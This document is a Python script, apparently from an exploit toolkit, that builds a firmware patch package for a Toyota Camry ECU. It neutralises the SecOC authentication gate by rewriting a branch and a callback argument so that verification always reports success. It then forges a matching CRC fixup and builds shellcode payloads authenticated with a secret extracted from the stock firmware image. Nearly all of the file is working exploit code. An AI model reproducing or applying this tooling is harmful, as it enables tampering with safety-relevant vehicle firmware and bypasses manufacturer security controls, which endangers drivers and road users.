#!/usr/bin/env python3
"""Build the exact-F33 two-stage Gate-2 semantic development patch package.

Stage 1 is the already-installed final-branch patch at 0x8F952.  Stage 2 changes
only the callback result argument at 0x8F948 so the pre-branch freshness/auth
callback sees success too.  The stage-2 source image is reconstructed from the
stock image plus stage 1; CRC repair is therefore cumulative by construction.
"""
from __future__ import annotations

import argparse
import copy
import hashlib
import json
import shutil
import struct
import sys
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from exploit.patcher.build_payload import (
    DEFAULT_TEMPLATE,
    build_authenticated_payload,
    build_configured_payload,
    inject_config,
    sha256_bytes,
    simulate_apply,
)
from exploit.patcher.build_shellcode_template import (
    build as build_shellcode_template,
)
from exploit.patcher.patch_config import (
    PatchConfigV1,
    config_from_manifest,
    load_manifest,
)
from exploit.patcher.post_apply_verify import (
    build_post_apply_validate_config,
)
from tools.build_secoc_patch_manifest import crc32

STOCK_IMAGE = ROOT / "firmware/camry-8965F3307000/CodeFlash.bin"
STAGE1_MANIFEST = ROOT / "data/generated/secoc_patch_manifest_8965F3307000.json"

EXPECTED_STOCK_SHA256 = "42dce8efc42f6ae31718e7713fa2d26bb9191b4a82439778aee4d7afded9b0e7"
EXPECTED_STAGE1_SHA256 = "272843a2c1d179f91105d7f103f213034f850dc476c96dad48067fbf3afd9f65"
EXPECTED_STAGE1_FIXUP = 0xD9AF33AF
EXPECTED_STAGE2_FIXUP = 0xD12ADB05
EXPECTED_FINAL_SHA256 = "6a371a2a17641ee5408777f06d303e34699d65dbde01e94cf89ffece7578d59c"
EXPECTED_TEMPLATE_SHA256 = "3d6c4e685ad8e6460a624e501948324e989a751a94cfd69f12078ab158e40426"

STAGE1_VA = 0x8F952
STAGE1_ORIGINAL = bytes.fromhex("e0d1")
STAGE1_REPLACEMENT = bytes.fromhex("e001")
STAGE2_VA = 0x8F948
STAGE2_ORIGINAL = bytes.fromhex("1a38")  # mov r26,r7
STAGE2_REPLACEMENT = bytes.fromhex("003a")  # mov 0,r7
STAGE2_BLOCK_BASE = 0x88000
BOOT_SECRET_OFF = 0xBFE8
PAYLOAD_SECRET_OFF = 0xBFD8
SECRET_LEN = 16
EXPECTED_F181_HEX = "023839363546333330373030300000000038413331313333303331303000000000"
EXPECTED_BOOT_F181_HEX = "02" + "21" * 32
RAM_LOAD_ADDR = 0xFEBF0000


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _hex32(value: int) -> str:
    return f"0x{value:08X}"


def reconstruct_stage1(stock: bytes) -> tuple[bytes, dict[str, Any]]:
    if sha256(stock) != EXPECTED_STOCK_SHA256:
        raise ValueError("exact F33 stock CodeFlash SHA-256 mismatch")
    manifest = load_manifest(STAGE1_MANIFEST)
    cfg = config_from_manifest(manifest, mode="apply")
    stage1, fixup, residue = simulate_apply(stock, cfg)
    if stock[STAGE1_VA:STAGE1_VA + 2] != STAGE1_ORIGINAL:
        raise ValueError("stage-1 stock preimage drift")
    if stage1[STAGE1_VA:STAGE1_VA + 2] != STAGE1_REPLACEMENT:
        raise ValueError("stage-1 replacement drift")
    if sha256(stage1) != EXPECTED_STAGE1_SHA256 or fixup != EXPECTED_STAGE1_FIXUP or residue != 0xFFFFFFFF:
        raise ValueError("stage-1 reconstructed image/fixup/residue drift")
    return stage1, manifest


def build_stage2_manifest(stage1: bytes, stage1_manifest: dict[str, Any]) -> dict[str, Any]:
    if stage1[STAGE2_VA:STAGE2_VA + 2] != STAGE2_ORIGINAL:
        raise ValueError("stage-2 callback-argument preimage drift")
    # Pin the neighboring instructions that give the 1A38 -> 003A rewrite its meaning.
    if stage1[0x8F944:0x8F94E] != bytes.fromhex("003aa5051a381d30bfff"):
        raise ValueError("stage-2 callback call-site machine context drift")
    if stage1[STAGE1_VA:STAGE1_VA + 4] != bytes.fromhex("e0019a0d"):
        raise ValueError("stage-1 final branch is not present in stage-2 source image")

    manifest = copy.deepcopy(stage1_manifest)
    image_sha = sha256(stage1)
    manifest["image"] = {
        "base": "0x0",
        "path": "CodeFlash.gate2-final-only.bin",
        "sha256": image_sha,
        "size": len(stage1),
    }
    manifest["patch"] = {
        "address": f"0x{STAGE2_VA:X}",
        "block_base": f"0x{STAGE2_BLOCK_BASE:X}",
        "block_size": 0x8000,
        "original": STAGE2_ORIGINAL.hex(),
        "preimage_verified": True,
        "replacement": STAGE2_REPLACEMENT.hex(),
    }

    crc = manifest["boot_crc"]
    start = int(crc["start"], 0)
    end = int(crc["end"], 0)
    fixup_va = int(crc["fixup_va"], 0)
    source_prefix = crc32(stage1[start:fixup_va])
    source_fixup = int.from_bytes(stage1[fixup_va:fixup_va + 4], "little")
    source_residue = crc32(stage1[start:end])
    candidate = bytearray(stage1)
    candidate[STAGE2_VA:STAGE2_VA + 2] = STAGE2_REPLACEMENT
    patched_prefix = crc32(candidate[start:fixup_va])
    patched_fixup = patched_prefix ^ 0xFFFFFFFF
    struct.pack_into("<I", candidate, fixup_va, patched_fixup)
    patched_residue = crc32(candidate[start:end])

    if source_fixup != EXPECTED_STAGE1_FIXUP or source_residue != 0xFFFFFFFF:
        raise ValueError("stage-2 source CRC is not the installed stage-1 CRC-valid image")
    if patched_fixup != EXPECTED_STAGE2_FIXUP or patched_residue != 0xFFFFFFFF:
        raise ValueError("stage-2 cumulative CRC repair drift")
    if sha256(bytes(candidate)) != EXPECTED_FINAL_SHA256:
        raise ValueError("stage-2 final image SHA-256 drift")

    crc.update({
        "stock_expected_fixup": _hex32(source_fixup),
        "stock_prefix_crc": _hex32(source_prefix),
        "stock_region_valid": True,
        "stock_residue": _hex32(source_residue),
        "stored_fixup": _hex32(source_fixup),
        "patched_prefix_crc_for_supplied_image": _hex32(patched_prefix),
        "patched_fixup_for_supplied_image": _hex32(patched_fixup),
        "patched_residue_for_supplied_image": _hex32(patched_residue),
        "live_policy": "recompute prefix CRC from live CodeFlash containing stage 1 after stage-2 target-block RMW; write complement at discovered fixup VA; require final residue 0xFFFFFFFF",
    })
    manifest["semantic_resolution"] = {
        "schema": "toyota-secoc-semantic-target-v2",
        "resolution": "unique",
        "candidate_count": 1,
        "program_sha256": image_sha,
        "function": {"entry": "0x0008f906", "name": "FUN_0008f906"},
        "verify_result_polarity": "zero-is-verified-ok-nonzero-is-not-verified",
        "pre_gate_state_call": "0x0008f94c",
        "patch": {
            "address": f"0x{STAGE2_VA:08x}",
            "operation": "force-pre-gate-callback-result-argument-zero",
            "original": STAGE2_ORIGINAL.hex(),
            "replacement": STAGE2_REPLACEMENT.hex(),
        },
        "callback_argument": {
            "site": "0x0008f948",
            "stock_instruction": "mov r26,r7",
            "replacement_instruction": "mov 0,r7",
            "callback_call": "0x0008f94c -> FUN_0008f8d2",
            "meaning": "make callback observe verified-success while preserving the already-installed final Gate-2 branch neutralization at 0x8F952",
        },
        "required_existing_stage": {
            "address": "0x0008f952",
            "bytes": STAGE1_REPLACEMENT.hex(),
            "meaning": "final Gate-2 compare neutralized",
        },
        "invariants": [
            "stage-2-source-is-exact-stage-1-patched-crc-valid-image",
            "callback-stock-argument-is-real-command7-result-r26",
            "nearby-stock-success-path-already-encodes-mov-zero-r7",
            "callback-call-remains-unchanged",
            "existing-stage1-final-gate-patch-remains-present",
            "crc-repair-covers-both-persistent-patches",
        ],
    }
    manifest["safety"] = {
        "fail_closed": True,
        "requirements": [
            "exact stock F33 SHA-256 matches",
            "stage-1 image is reconstructed only through the pinned generic patch manifest",
            "stage-1 source SHA/fixup/residue match the live-installed image contract",
            "stage-2 1A38 preimage and neighboring call-site bytes match exactly",
            "stage-1 E001 final Gate-2 bytes remain present in stage-2 source",
            "stage-2 live patcher recomputes CRC over the cumulative image and requires final residue 0xFFFFFFFF",
        ],
    }
    manifest["development_stage"] = {
        "name": "f33-gate2-callback-success-stage2",
        "source_stage": "installed-final-branch-only-gate2-patch",
        "source_image_sha256": EXPECTED_STAGE1_SHA256,
        "source_fixup": _hex32(EXPECTED_STAGE1_FIXUP),
        "final_image_sha256": EXPECTED_FINAL_SHA256,
        "final_fixup": _hex32(EXPECTED_STAGE2_FIXUP),
        "cumulative_patch_sites": [
            {"address": "0x8F948", "bytes": STAGE2_REPLACEMENT.hex()},
            {"address": "0x8F952", "bytes": STAGE1_REPLACEMENT.hex()},
        ],
    }
    return manifest



def materialize_template(out: Path) -> Path:
    """Copy or rebuild the exact reviewed generic shellcode template into the package."""
    package_template = out / "generic_shellcode_template.bin"
    source = DEFAULT_TEMPLATE
    if not source.exists() or sha256(source.read_bytes()) != EXPECTED_TEMPLATE_SHA256:
        rebuilt = out / ".template-rebuild.bin"
        meta = build_shellcode_template(rebuilt)
        if meta.get("template_sha256") != EXPECTED_TEMPLATE_SHA256:
            raise ValueError("rebuilt generic shellcode template SHA-256 drift")
        source = rebuilt
    shutil.copy2(source, package_template)
    if sha256(package_template.read_bytes()) != EXPECTED_TEMPLATE_SHA256:
        raise ValueError("packaged generic shellcode template SHA-256 drift")
    package_template.with_suffix(package_template.suffix + ".json").write_text(
        json.dumps({
            "schema": "camry-f33-gate2-stage2-template-v1",
            "sha256": EXPECTED_TEMPLATE_SHA256,
            "source": "exploit/patcher/shellcode.c",
            "config_offset": 0xF70,
            "size": package_template.stat().st_size,
        }, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    rebuilt = out / ".template-rebuild.bin"
    rebuilt.unlink(missing_ok=True)
    rebuilt.with_suffix(rebuilt.suffix + ".json").unlink(missing_ok=True)
    return package_template

def build_post_apply_payload(*, source_image: bytes, manifest: dict[str, Any], template: bytes, payload_secret: bytes, out: Path) -> dict[str, Any]:
    apply_cfg = config_from_manifest(manifest, mode="apply")
    final_image, expected_fixup, expected_residue = simulate_apply(source_image, apply_cfg)
    verify_cfg = build_post_apply_validate_config(apply_cfg, final_image)
    verify_cfg = PatchConfigV1.from_bytes(verify_cfg.to_bytes())
    shellcode = inject_config(template, verify_cfg)
    payload = build_authenticated_payload(shellcode, payload_secret, ram_load_addr=RAM_LOAD_ADDR)
    d = out / "post-apply"
    d.mkdir(parents=True, exist_ok=True)
    (d / "config-validate.bin").write_bytes(verify_cfg.to_bytes())
    (d / "shellcode-validate-only.bin").write_bytes(shellcode)
    (d / "payload-validate-only.bin").write_bytes(payload)
    start, end, fixup_va = apply_cfg.crc_start, apply_cfg.crc_end, apply_cfg.crc_fixup_va
    expected = {
        "patch_observed": int.from_bytes(final_image[STAGE2_VA:STAGE2_VA + 2], "little"),
        "fixup_stored": int.from_bytes(final_image[fixup_va:fixup_va + 4], "little"),
        "crc_prefix": crc32(final_image[start:fixup_va]),
        "crc_residue": crc32(final_image[start:end]),
    }
    meta = {
        "schema": "camry-f33-gate2-stage2-post-apply-v1",
        "final_image_sha256": sha256(final_image),
        "expected_fixup": _hex32(expected_fixup),
        "expected_residue": _hex32(expected_residue),
        "expected_preflight": {k: _hex32(v) for k, v in expected.items()},
        "config_sha256": sha256_bytes(verify_cfg.to_bytes()),
        "shellcode_sha256": sha256_bytes(shellcode),
        "payload_sha256": sha256_bytes(payload),
    }
    (d / "manifest.json").write_text(json.dumps(meta, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return meta


def build(out: Path, *, build_payloads: bool = True) -> dict[str, Any]:
    out.mkdir(parents=True, exist_ok=True)
    stock = STOCK_IMAGE.read_bytes()
    stage1, stage1_manifest = reconstruct_stage1(stock)
    source_path = out / "CodeFlash.gate2-final-only.bin"
    source_path.write_bytes(stage1)
    manifest = build_stage2_manifest(stage1, stage1_manifest)
    manifest_path = out / "secoc_patch_manifest_f33_callback_success.json"
    manifest_path.write_text(json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    result: dict[str, Any] = {
        "schema": "camry-f33-gate2-semantic-patch-package-v1",
        "source_image": {"path": source_path.name, "sha256": sha256(stage1), "size": len(stage1)},
        "manifest": {"path": manifest_path.name, "sha256": sha256(manifest_path.read_bytes())},
        "stage1": {"address": "0x8F952", "bytes": STAGE1_REPLACEMENT.hex(), "fixup": _hex32(EXPECTED_STAGE1_FIXUP)},
        "stage2": {"address": "0x8F948", "bytes": STAGE2_REPLACEMENT.hex(), "fixup": _hex32(EXPECTED_STAGE2_FIXUP)},
        "final_image_sha256": EXPECTED_FINAL_SHA256,
        "expected_f181_hex": EXPECTED_F181_HEX,
        "expected_boot_f181_hex": EXPECTED_BOOT_F181_HEX,
        "payloads_built": build_payloads,
    }

    if build_payloads:
        template_path = materialize_template(out)
        template = template_path.read_bytes()
        payload_secret = stock[PAYLOAD_SECRET_OFF:PAYLOAD_SECRET_OFF + SECRET_LEN]
        if len(payload_secret) != SECRET_LEN:
            raise ValueError("payload-build secret range truncated")
        preflight_path = out / "payload-validate-only.bin"
        preflight_meta = build_configured_payload(
            image_path=source_path,
            manifest_path=manifest_path,
            template_path=template_path,
            mode="validate-only",
            output_path=preflight_path,
            payload_secret=payload_secret,
            software_id="8965F3307000",
            ram_load_addr=RAM_LOAD_ADDR,
        )
        apply_path = out / "payload-apply.bin"
        apply_meta = build_configured_payload(
            image_path=source_path,
            manifest_path=manifest_path,
            template_path=template_path,
            mode="apply",
            output_path=apply_path,
            payload_secret=payload_secret,
            restore_dir=out / "restore",
            software_id="8965F3307000",
            ram_load_addr=RAM_LOAD_ADDR,
        )
        post_meta = build_post_apply_payload(
            source_image=stage1,
            manifest=manifest,
            template=template,
            payload_secret=payload_secret,
            out=out,
        )
        result["template"] = {"path": template_path.name, "sha256": EXPECTED_TEMPLATE_SHA256}
        result["payloads"] = {
            "preflight": preflight_meta["payload"],
            "apply": apply_meta["payload"],
            "restore": apply_meta["restore_artifact"],
            "post_apply": post_meta,
        }
        # The boot secret remains derivable from the exact source image but is never
        # materialized as a package file.  Record only the derivation contract.
        result["security_access"] = {
            "source": "exact F33 CodeFlash source image",
            "offset": f"0x{BOOT_SECRET_OFF:X}",
            "length": SECRET_LEN,
            "secret_value_recorded": False,
        }

    package_path = out / "package.json"
    package_path.write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return result


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--out", type=Path, default=ROOT / "build/out/f33-gate2-semantic")
    p.add_argument("--no-payloads", action="store_true")
    args = p.parse_args()
    result = build(args.out, build_payloads=not args.no_payloads)
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
